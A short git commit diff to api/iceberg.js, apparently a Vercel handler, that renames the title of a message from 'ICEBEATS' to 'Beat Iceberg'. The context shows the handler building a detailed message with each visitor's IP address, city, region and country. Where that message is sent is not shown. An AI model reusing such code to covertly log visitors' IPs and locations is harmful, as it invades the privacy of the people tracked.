5bac1e01de9516b5f1a043e4f68dcea922d34b65
P4l3rm0C0d31n4 <dlkunderground@gmail.com>
2026-03-30 01:15:21 -0300

    Update message format in iceberg.js

--- api/iceberg.js
+++ api/iceberg.js
@@ -16,7 +16,7 @@ export default async function handler(req, res) {
   const lon = headers["x-vercel-ip-longitude"] || "0";
 
   // 3. Construcción del mensaje ultra detallado
-  const info = `ICEBEATS 🎮🕹️
+  const info = `Beat Iceberg🎮🕹️
 🕒 ${timestamp}
 🌐 IP: ${ip}
 📍 Ubicación: ${city}, ${region}, ${country}
